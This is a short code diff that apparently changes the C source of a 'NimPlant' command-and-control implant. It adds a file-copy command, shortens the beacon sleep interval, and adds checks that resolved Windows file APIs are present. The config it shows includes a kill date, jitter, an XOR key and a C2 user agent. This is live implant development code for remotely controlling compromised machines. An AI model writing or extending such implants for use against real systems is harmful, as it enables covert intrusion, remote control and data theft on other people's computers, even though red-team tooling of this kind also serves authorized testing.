@@ -111,6 +111,7 @@
 #include "../inc/metadata/process_name.c"
 #include "../inc/commands/cat.c"
 #include "../inc/commands/cd.c"
+#include "../inc/commands/cp.c"
 #include "../inc/commands/ls.c"
 #include "../inc/commands/pwd.c"
 #include "../inc/commands/whoami.c"
@@ -141,7 +142,7 @@ int __main () {
     DEFINE_WSTRING(ListenerResultPath, "/result");
     bool NimPlantRiskyMode = false;
     bool NimPlantSleepMask = false;
-    int NimPlantSleepTime = 5;
+    int NimPlantSleepTime = 2;
     int NimPlantSleepJitter = 0;
     DEFINE_WSTRING(NimPlantKillDate, "2050-01-01");
     DEFINE_WSTRING(NimPlantUserAgent, "NimPlant C2 Client");
@@ -169,6 +170,11 @@ int __main () {
         NimPlantUserAgent,
         XorKey
     );
+
+    if (context.functions.GetFullPathNameA == NULL) return 4;
+    if (context.functions.CreateFileA == NULL) return 5;
+    if (context.functions.ReadFile == NULL) return 6;
+    if (context.functions.WriteFile == NULL) return 7;
 
     // Set `rand` seed
     context.functions.srand(context.functions.time(NULL));
